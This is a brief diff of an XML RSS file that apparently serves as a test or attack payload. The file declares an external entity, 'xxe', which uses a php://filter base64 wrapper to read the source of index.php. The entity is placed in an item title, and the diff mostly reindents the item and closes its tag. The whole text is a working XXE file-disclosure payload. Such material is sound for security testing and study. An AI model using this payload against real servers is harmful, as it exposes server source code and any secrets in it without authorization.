@@ -4,6 +4,7 @@
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
-  <item>
-      <title>&xxe;</title>
-      <link>TEST</link>
+<item>
+  <title>&xxe;</title>
+  <link>TEST</link>
+</item>
